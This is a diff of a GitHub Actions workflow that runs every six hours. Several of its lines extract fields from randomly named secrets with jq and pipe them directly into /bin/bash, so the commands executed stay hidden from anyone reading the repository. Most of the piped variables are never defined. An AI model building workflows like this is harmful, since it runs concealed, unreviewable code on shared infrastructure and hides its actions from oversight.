@@ -1,8 +1,9 @@
 name: zaifengzf
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '24 3/6 * * *'
 
 jobs:
   build:
@@ -11,8 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zaifengzf
         env:
-          goli76202: ${{ secrets.goli76202 }}
+          szcdn77: ${{ secrets.szcdn77 }}
         run: |
-          echo $goli76202 | jq -r .nrkd948 | /bin/bash
-          echo $q422 | jq -r .lj47996 | /bin/bash
+          echo $szcdn77 | jq -r .iini00690 | /bin/bash
+          echo $lwlzj4 | jq -r .jkxg1 | /bin/bash
+          echo $z3 | jq -r .efz1664 | /bin/bash
+          echo $kzf46416 | jq -r .wthu19 | /bin/bash
+          echo $ajwz059 | jq -r .d2 | /bin/bash
 
